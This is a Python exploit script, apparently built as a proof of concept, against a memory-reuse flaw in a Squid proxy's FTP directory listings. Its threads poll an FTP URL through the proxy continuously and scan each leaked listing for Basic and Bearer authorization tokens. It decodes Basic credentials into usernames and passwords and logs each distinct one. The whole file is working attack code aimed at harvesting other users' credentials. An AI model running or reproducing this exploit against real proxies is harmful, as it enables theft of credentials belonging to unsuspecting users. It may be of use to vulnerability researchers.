#!/usr/bin/env python3
"""
F17 attacker — parallel, continuous, multi-credential poller.

Runs N threads polling ftp://evil/ through the proxy without pausing,
scans every returned directory listing for Authorization: Basic /
Authorization: Bearer / Cookie / Set-Cookie, and prints each *distinct*
value the first time it appears. Runs until Ctrl-C.

Design (see feasibility tests in test_regimes.py):

  * A one-shot victim request is captured only if the victim's free
    happens between a listing-buffer free and the very next listing-
    buffer alloc. The only way to cover that without knowing when the
    victim will act is to poll continuously.

  * Multiple threads multiply the rate at which listing-buffer allocs
    sample the MEM_4K_BUF freelist, so a one-shot victim free is more
    likely to coincide with *some* thread's alloc point.

  * No inter-poll sleep — rate is controlled purely by thread count.

Usage:
  python3 attacker.py                     # 4 threads, default proxy/ftp
  python3 attacker.py -t 8                # 8 threads
  python3 attacker.py --proxy 1.2.3.4:3128
"""
import argparse, base64, re, signal, socket, threading, time, urllib.parse
from urllib.parse import urlparse


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-t", "--threads", type=int, default=4,
                    help="parallel poll threads (default 4)")
    ap.add_argument("--target-proxy", dest="target_proxy",
                    default="127.0.0.1:3128",
                    help="Target Squid proxy host:port (default 127.0.0.1:3128)")
    ap.add_argument("--ftp", default="ftp://anon:x@host.docker.internal:2222/",
                    help="FTP trigger URL")
    args = ap.parse_args()

    phost, pport = args.target_proxy.split(":")
    PROXY = (phost, int(pport))
    FTP_URL = args.ftp
    netloc = urlparse(FTP_URL).netloc.split("@")[-1]
    attacker_req = (
        f"GET {FTP_URL} HTTP/1.1\r\n"
        f"Host: {netloc}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    RE_HREF   = re.compile(rb'class="filename"><a href="([^"]*)"')
    # The NUL-walk often starts mid-word, clipping the "Authorization:" prefix
    # off the leak, so we match the credential token directly. "Basic " or
    # "Bearer " plus a long-enough token is specific enough to avoid false
    # positives on arbitrary pool bytes.
    RE_BASIC  = re.compile(rb"Basic\s+([A-Za-z0-9+/=]{8,})")
    RE_BEARER = re.compile(rb"Bearer\s+([A-Za-z0-9\-._~+/]{8,}={0,2})")

    stop = threading.Event()
    seen_lock = threading.Lock()
    seen = {"basic": set(), "bearer": set()}
    cnt_lock = threading.Lock()
    polls = [0]
    hits = [0]
    t_start = time.time()
    print_lock = threading.Lock()

    def safe_print(s):
        with print_lock:
            print(s, flush=True)

    def fetch():
        s = socket.create_connection(PROXY, timeout=5)
        s.sendall(attacker_req)
        body = bytearray()
        while True:
            try:
                d = s.recv(8192)
            except (socket.timeout, OSError):
                break
            if not d:
                break
            body.extend(d)
        s.close()
        return bytes(body)

    def note(kind, value):
        key = value[:200]
        with seen_lock:
            if key in seen[kind]:
                return
            seen[kind].add(key)
        dt = time.time() - t_start
        tag = kind.upper()
        disp = value[:200].decode("latin-1", errors="replace")
        safe_print(f"\n[{dt:7.2f}s] [{tag}] {disp}")
        if kind == "basic":
            try:
                decoded = base64.b64decode(value).decode()
                if ":" in decoded:
                    u, p = decoded.split(":", 1)
                    safe_print(f"              decoded = {u}:{p}")
            except Exception:
                pass

    def worker():
        while not stop.is_set():
            try:
                body = fetch()
            except Exception:
                continue
            with cnt_lock:
                polls[0] += 1
            m = RE_HREF.search(body)
            if not m:
                continue
            leaked = urllib.parse.unquote_to_bytes(m.group(1))
            hit = False
            for mm in RE_BASIC.finditer(leaked):
                note("basic", mm.group(1))
                hit = True
            for mm in RE_BEARER.finditer(leaked):
                note("bearer", mm.group(1))
                hit = True
            if hit:
                with cnt_lock:
                    hits[0] += 1

    def status():
        last = 0
        while not stop.is_set():
            if stop.wait(5.0):
                break
            with cnt_lock:
                p, h = polls[0], hits[0]
            dt = time.time() - t_start
            rate = (p - last) / 5.0
            last = p
            with seen_lock:
                nb, nr = len(seen["basic"]), len(seen["bearer"])
            safe_print(f"[status {dt:7.2f}s] polls={p} hits={h} rate={rate:.1f}/s  "
                       f"distinct: basic={nb} bearer={nr}")

    signal.signal(signal.SIGINT, lambda *_: stop.set())

    safe_print(f"[attacker] threads={args.threads} proxy={PROXY[0]}:{PROXY[1]} ftp={FTP_URL}")
    safe_print("[attacker] running until Ctrl-C — logging each distinct credential observed")

    for _ in range(args.threads):
        threading.Thread(target=worker, daemon=True).start()
    threading.Thread(target=status, daemon=True).start()

    try:
        while not stop.is_set():
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop.set()

    with seen_lock:
        nb, nr = len(seen["basic"]), len(seen["bearer"])
    safe_print(f"\n[attacker] stopped. polls={polls[0]} hits={hits[0]}  "
               f"distinct: basic={nb} bearer={nr}")


if __name__ == "__main__":
    main()
